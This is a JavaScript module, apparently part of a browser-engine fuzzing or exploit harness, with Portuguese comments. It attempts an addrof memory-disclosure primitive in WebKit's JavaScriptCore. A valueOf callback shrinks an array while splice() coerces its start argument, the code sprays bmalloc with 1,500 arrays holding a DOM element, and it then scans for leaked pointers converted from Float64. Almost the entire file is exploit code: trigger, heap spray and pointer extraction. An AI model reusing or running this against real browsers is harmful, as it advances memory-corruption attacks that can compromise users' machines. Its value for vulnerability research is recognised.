
export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva addrof definitiva via Butterfly. Coerção do argumento start no splice() ' +
        'destrói a memória síncronamente. Pulverização do bmalloc com blocos de tamanho 20 ' +
        'para sobrepor a memória e converter ponteiros nativos em Float64.',

    setup: function() {
        this.results = {};
        
        // 1. O array vulnerável com o tamanho exato que funcionou no seu baseline
        this.vulnArray = new Array(20).fill(1.111111);
        
        // 2. A Cobaia
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        const self = this;
        
        // 3. A Bomba Relógio
        this.evilObject = {
            valueOf: function() {
                // Encolhe o array, libertando o Butterfly antigo
                self.vulnArray.length = 0;
                
                // Pulverizamos o bmalloc APENAS com arrays do mesmo tamanho (20)
                // contendo a nossa cobaia (ArrayWithContiguous)
                self.trash = [];
                for(let i = 0; i < 1500; i++) {
                    self.trash.push(new Array(20).fill(self.targetObj));
                }
                
                return 0; // Retorna 0 para o splice() iniciar a sua lógica
            }
        };
    },

    trigger: function() {
        try {
            // O GATILHO: Força a coerção do parâmetro start.
            // Escreve 9.999999 no índice 0, corrompendo a memória vizinha.
            this.vulnArray.splice(this.evilObject, 0, 9.999999);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Executado',
        
        // O Extrator addrof SILENCIOSO (Só fala se capturar o troféu)
        s => {
            // Vamos varrer os índices restantes que deviam estar vazios
            for(let i = 1; i < 20; i++) {
                let val = s.vulnArray[i];
                
                // Se encontrarmos um número que não estava lá...
                if (typeof val === 'number' && val !== 1.111111 && val !== 9.999999 && val !== 0 && !isNaN(val)) {
                    
                    const buf = new ArrayBuffer(8);
                    const f64 = new Float64Array(buf);
                    const u64 = new BigUint64Array(buf);
                    
                    f64[0] = val;
                    const addr = u64[0] & 0x0000FFFFFFFFFFFFn;
                    
                    // Se for um ponteiro Userspace válido
                    if (addr > 0x100000n) {
                        return `🏆 ADDROF SUCESSO: 0x${addr.toString(16).toUpperCase()} no índice [${i}]`;
                    }
                }
            }
            // Se falhar o alinhamento, retorna o número 0.
            // O executor vê que o Baseline (0) == Pós-Free (0) e esconde o log. Fuzzer limpo!
            return 0; 
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.trash = null;
        this.results = {};
    }
};
